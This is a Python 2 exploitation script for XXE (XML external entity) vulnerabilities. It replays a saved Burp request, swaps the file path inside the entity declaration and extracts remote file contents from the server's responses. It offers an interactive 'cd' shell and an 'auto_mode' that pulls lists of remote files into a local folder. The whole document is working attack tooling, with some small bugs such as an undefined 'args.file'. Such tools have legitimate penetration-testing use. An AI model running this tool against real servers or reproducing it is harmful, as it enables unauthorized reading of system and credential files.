#!/usr/bin/env python

# Written by Brad Beltman  @BradBeltman

# The purpose of this script is exploitation of a discovered XXE vulnerability

import sys
import os
import argparse
import urllib2
import re
import readline

# This code block for tab auto-completion of available commands
if 'libedit' in readline.__doc__:
    readline.parse_and_bind("bind ^I rl_complete")  # This makes tab completion work on OSX
else:
    readline.parse_and_bind("tab: complete")  # Tab completion for everything else


class MyCompleter(object):  # For command auto completion
    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        if state == 0:  # on first trigger, build possible matches
            if text:  # cache matches
                self.matches = [s for s in self.options
                                if s and s.startswith(text)]
            else:
                self.matches = self.options[:]

        try:
            return self.matches[state]
        except IndexError:
            return None

completer = MyCompleter(["auto_mode", "cd", "clear_path", "exit"])  # List of valid commands to auto complete
readline.set_completer(completer.complete)
# End auto complete code block


class Colors:
    # This class adds colored text
        header = '\033[95m'
        blue = '\033[94m'
        green = '\033[92m'
        warning = '\033[93m'
        fail = '\033[91m'
        endc = '\033[0m'
        bold = '\033[1m'
        underline = '\033[4m'


def parse_burp(burp):
    # Parse a saved Burp request file to populate necessary variables
    print(Colors.green + "[*] " + Colors.endc + "Reading file " + burp)

    # Make sure we can open the file as an XML doc
    try:
        tree = ET.parse(burp)
    except IOError:
        print(Colors.fail + "\nThere was an error opening the file from Burp, "
                            "make sure it is not corrupted!\n" + Colors.endc)
        sys.exit(1)

    # Make sure we're parsing a compatible file format, then grab parameters
    try:
        xml_root = tree.getroot()
        if (xml_root[0][05].tag == 'method' and xml_root[0][02].tag == 'host'
            and xml_root[0][06].tag == 'path' and xml_root[0][03].tag == 'port'
                and xml_root[0][12].tag == 'response'):
            method = xml_root[0][05].text
            url = xml_root[0][01].text
            # Specifying full path to workaround an unknown error, not sure why the
            # scheme used on the others breaks for this one
            r = xml_root._children[0]._children[8].text
            request = base64.decodestring(r)
            burp_vars = []
            burp_vars.extend((method, url, request))
    except IOError:
        print(Colors.fail + "\nThere was a problem parsing the Burp file, "
                            "perhaps it was created from an incompatible version of Burp?\n" + Colors.endc)
        sys.exit(1)

    print(Colors.green + "[*] " + Colors.endc + "File parsed successfully\n")

    return burp_vars


def parse_request(request, method):
    # Parse the HTTP request stored in a saved Burp file

    try:
        # Grab POST parameters
        if method == 'POST':
            post = request.split("\r\n\r\n")  # Split on blank line, anything after should be POST body
            post_body = post[1]
    except IOError:
        print(Colors.fail + "\nCouldn't get the POST body, "
                            "even though this is appears to be a POST request.\n" + Colors.endc)
        sys.exit(1)

    try:
        # Parse and pull out necessary headers, skip headers that URL lib will include for us. Add others as needed
        http_headers = []
        for line in request.split("\r\n"):
            if line.lower().startswith('post '):
                continue
            elif line.lower().startswith('get '):
                continue
            elif line.lower().startswith('host:'):
                continue
            elif line.lower().startswith('content-length: '):
                continue
            elif line.lower().startswith('user-agent:'):
                continue
            elif line is '':
                break
            else:
                http_headers.append(line)
    except IOError:
        print(Colors.fail + "\nThere was an error parsing the HTTP request "
                            "within the Burp file, I can't continue\n" + Colors.endc)
        sys.exit(1)

    if method == 'POST':
        return http_headers, post_body
    else:
        return http_headers


def new_post(my_post, my_file):
    # Parse the POST body to find where we're specifying the remote file, so it can be easily changed
    np = re.sub('://.*?"', '://' + my_file + '"', my_post, 1)
    return np


def file_prompt(my_method, remote_path):
    # Prompt the user for the remote file they want
    try:
        if remote_path:
            prompt = "Remote File: " + remote_path + "> "
        else:
            prompt = "Remote File> "
        f = raw_input(prompt)
        if f != '':
            return f
        else:
            print(Colors.green + "\nGood bye!\n" + Colors.endc)
            sys.exit(0)
    except IOError:
        print(Colors.fail + "Something went wrong setting up the file prompt, so I need to close!" + Colors.endc)
        sys.exit(1)


def dir_backup(remote_dir):
    # Implement .. notation for backing up a directory
    if remote_dir.endswith('/'):
        remote_dir = remote_dir.rstrip('/')
    new_dir = remote_dir.rsplit('/', 1)[0]  # This will also remove the split character
    return new_dir


def out_dir(o_dir=''):
    # Specify a directory to output file contents
    try:
        while True:
            if o_dir == '':
                o_dir = raw_input("Please give me an output directory to use.\n"
                                  "Type " + Colors.green + "'none'" + Colors.endc + " or leave "
                                                                                    "blank to continue without one: ")
                if o_dir.lower() == 'none' or o_dir == "":
                    return o_dir
            elif o_dir:
                if os.path.isdir(o_dir):
                    use_dir = raw_input(Colors.warning + "\nDirectory already exists, "
                                                         "want me to use it? Y/N " + Colors.endc)
                    if use_dir.lower() == 'y':
                        print("\nI'll use " + Colors.green + o_dir + Colors.endc + " as my output directory\n")
                        return o_dir
                    else:
                        o_dir = ''
                elif os.path.isdir(o_dir) is False:
                    print("The output directory does not exist, I will create it for you")
                    os.mkdir(o_dir)
                    return o_dir
    except OSError:
        print(Colors.fail + "\nThere was an error creating the directory, try again!\n" + Colors.endc)
        out_dir()


def write_file(out_dir, my_file, file_contents):
    # If an output dir is specified, write retrieved files under it
    if file_contents is None:
        return
    # First set the filename by replacing forward slashes with underscores
    f = my_file.lstrip('/')  # Remove the beginning forward slash from the file name, if its there
    file_name = f.replace('/', '_')  # Replace the forward slash with an underscore before we write the file
    file_location = out_dir + "/" + file_name
    with open(file_location, 'w') as o:
        o.write(file_contents)


def auto_mode(auto_headers, auto_url, auto_dir):
    while True:
        in_file = raw_input("\nWhich file contains the list of files you want me to retrieve? (Leave blank to return): ")
        if in_file != '':
            try:
                with open(in_file, 'r') as i:
                    for line in i:
                        line = line.rstrip('\n')
                        auto_post = new_post(post_body, line)
                        file_contents = build_request(auto_headers, auto_url, line, args.prefix, args.suffix, auto_post)
                        if auto_dir == 'none':
                            print_to_screen(line, file_contents)
                        else:
                            write_file(auto_dir, line, file_contents)
                    break
            except IOError:
                print(Colors.fail + "Unable to open the file!" + Colors.endc)
        else:
            return


def build_request(my_headers, my_url, my_file, my_prefix, my_suffix='', my_post='', out_dir=''):
    # Build our HTTP request
    # Suffix is not required, on the off chance the file contents are the last thing displayed

    # Set the optional proxy parameter
    if args.proxy:
        proxy = args.proxy
        if my_url.startswith("https"):
            p = urllib2.ProxyHandler({'https': proxy})
        else:
            p = urllib2.ProxyHandler({'http': proxy})
        o = urllib2.build_opener(p)
    else:
        o = urllib2.build_opener()

    # Continue with or without a proxy
    urllib2.install_opener(o)

    # Split out the header name and value, this is how urllib expects them
    try:
        if my_headers:
            for h in my_headers:
                if h is not '':
                    this_header = re.split(': |:', h, 1)  # Only split on 1st occurrence, to avoid splitting a URL
                    o.addheaders.append((this_header[0], this_header[1]))
                else:
                    break
    except IOError:
        print(Colors.fail + "There was an error parsing the headers!")
        sys.exit(1)

    # Send the request to the target, and get our file contents
    try:
        xxe_request = urllib2.Request(my_url, my_post)
        xxe_exploit = urllib2.urlopen(xxe_request)
        response_headers = xxe_exploit.headers
        response_body = xxe_exploit.read()
        response_code = xxe_exploit.code
        # Set the offsets for the prefix and suffix, so we know where the file contents will be in the response
        try:
            if my_prefix and my_suffix in response_body:  # Verify prefix exists in the response
                    start = response_body.index(my_prefix) + len(my_prefix)
                    stop = response_body.index(my_suffix)
                    file_contents = response_body[start:stop]
                    return file_contents
            else:  # if the server responds without the prefix/suffix
                print(Colors.warning + "\nThe prefix/suffix were not found in the response, "
                                       "here is the response contents:" + Colors.endc)
                print(str(response_headers) + "\r\n")
                print(str(response_body))
        except IOError:
            print(Colors.fail + "Prefix is not set correctly, I need it to capture file contents!" + Colors.endc)
            sys.exit(1)
    except urllib2.HTTPError as err:
        print(Colors.warning + "\nServer returned a code of " + str(err.code) + " " + err.reason + Colors.endc)
        print("Here are the headers:")  # urllib2 doesn't return the full body on error....wtf?
        print(err.headers)
        return


def print_to_screen(my_file, file_contents):
    print(Colors.green + "\n--------- Here are the contents of " +
          Colors.endc + my_file + Colors.green + " ----------" + Colors.endc)
    print file_contents


def command_help():
    print("\nAvailable Commands (Use the tab key to auto-complete commands):")
    print("Type " + Colors.green + "'auto_mode'" + Colors.endc +
          " to choose a file containing files (full path) to automatically attempt to retrieve")
    print("Type " + Colors.green + "'cd'" + Colors.endc + " to change the remote directory you are attempting to access. (Example: cd /etc)")
    print("Type " + Colors.green + "'clear_path'" + Colors.endc + " to clear the remote directory path")
    print("Type " + Colors.green + "'exit'" + Colors.endc + " to exit or leave blank and press enter")
    print("\n")


# Parse all incoming arguments
parser = argparse.ArgumentParser(description='This program is designed to help exploit a discovered XXE vulnerability')
# Group arguments together
burp = parser.add_argument_group('Burp File')
cmd_line = parser.add_argument_group('Command Line Only')
required = parser.add_argument_group('Required arguments')

cmd_line.add_argument('-u',   dest='url',     help='The vulnerable URL (if not reading from a Burp file)',
                      metavar='TARGET_URL')
cmd_line.add_argument('-m',   dest='method',  help='Method to use (if not reading from a Burp file)',
                      choices=['POST', 'GET'])
cmd_line.add_argument('-b',   dest='body',    help='POST body to use (if not reading from a Burp file)',
                      metavar='POST_BODY')
burp.add_argument('-r',   dest='burp',      help='Saved Burp file to read from (right-click, Save Item in Burp)',
                  metavar='BURP_FILE')
required.add_argument('-p',   dest='prefix',  help='Prefix for the remote file output, like an XML tag in the response '
                                                   'directly before the file contents begin', required=True)
parser.add_argument('-s',   dest='suffix',  help='Suffix for the remote file output, like an XML closing tag directly '
                                                 'behind the file contents in the response')
parser.add_argument('-o',   dest='out_dir', help='Output directory to copy file contents into')
parser.add_argument('-x',   dest='proxy',   help='HTTP proxy to send requests through')

try:
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(2)

    args = parser.parse_args()

    # if -r is passed on cli, parse the Burp file and set variables from it
    if args.burp and args.prefix:
        import xml.etree.ElementTree as ET  # Used to parse a Burp XML file using -r
        import base64  # Used to decode the base64 encoded request inside the saved Burp file
        burp = args.burp
        # Parse the Burp file for variables and HTTP headers
        my_vars = parse_burp(burp)
        my_vars.append(args.prefix)
        my_vars.append(args.suffix)
        # Parse the request and grab headers
        request_vars = parse_request(my_vars[2], my_vars[0])  # Send the request contents and method, respectively
        http_headers = request_vars[0]
    elif args.method and args.url and args.body and args.prefix:
        my_vars = [args.method, args.url, args.body, args.file, args.prefix, args.suffix]
    else:
        parser.print_help()
        sys.exit(2)

    # Set our variables
    method = my_vars[0]
    url = my_vars[1]
    request = my_vars[2]
    prefix = my_vars[3]
    suffix = my_vars[4]
    output_dir = args.out_dir

    # Show the user which variables are in use, so they can make sure everything looks good
    print(Colors.green + "[*] " + Colors.endc + "Using these variables:")
    print(Colors.green + "[*] " + Colors.endc + "   Method: " + method)
    print(Colors.green + "[*] " + Colors.endc + "   URL: " + url)
    print(Colors.green + "[*] " + Colors.endc + "   Prefix: " + args.prefix)
    print(Colors.green + "[*] " + Colors.endc + "   Suffix: " + args.suffix)

    # List the headers parsed from the Burp file.  If not using a Burp file, this should be empty.
    if http_headers:
        print(Colors.green + "\n[*] " + Colors.endc + "Using these headers (urllib will add the others):")
        for header in http_headers:
            print(Colors.green + "[*]   " + Colors.endc + header)

    if args.proxy:  # Show proxy info if in use
        print("\nSending requests to proxy: " + Colors.green + args.proxy + Colors.endc + "\n")
    else:
        print("\n")  # Blank line to keep output readable

    # Prompt for an output directory if it wasn't specified on the command line
    if output_dir:
        print("[*]   Output Directory: " + output_dir + "\n")
        o_dir = out_dir(output_dir)
    else:
        o_dir = out_dir()

    if request_vars[1]:  # This should only be populated if we're dealing with a POST request
        post_body = request_vars[1]
        print("Type " + Colors.green + "'?'" + Colors.endc + " for a list of available commands")
        remote_path = ""
        while True:
            my_file = file_prompt(method.lower(), remote_path)
            f = my_file.lower()
            if f == '?':
                command_help()
            elif f == 'auto_mode':  # Prompt for an input file and attempt to retrieve all remote files listed in it
                auto_mode(http_headers, url, o_dir)
            elif f == 'clear_path':  # Clear the current directory path
                remote_path = ""
            elif f == 'cd ..':  # backup one directory level
                remote_path = dir_backup(remote_path)
            elif f.startswith("cd "):
                new_path = f.split("cd ", 1)[1]
                if not new_path.startswith("/") and remote_path:
                    remote_path = remote_path + "/" + new_path  # Don't want to type the full path to go down a dir level
                else:
                    remote_path = new_path
            elif f.lower() == "exit":
                sys.exit(0)
            else:
                if remote_path:
                    f = remote_path + "/" + f
                updated_post = new_post(post_body, f)
                file_contents = build_request(http_headers, url, f, args.prefix, args.suffix, updated_post)
                print_to_screen(f, file_contents)
                if o_dir not in ['none', '']:  # If not writing files to a directory, skip write_file function
                    write_file(o_dir, f, file_contents)

    else:
        while True:
            my_file = file_prompt(method.lower())
            f = my_file[0]
            file_contents = build_request(http_headers, url, f, args.prefix, args.suffix)
            print_to_screen(f, file_contents)
            if o_dir != 'none':
                write_file(o_dir, f, file_contents)
except KeyboardInterrupt:
    print(Colors.warning + "\n\nCaught ctrl + c, exiting!\n" + Colors.endc)
    sys.exit(1)
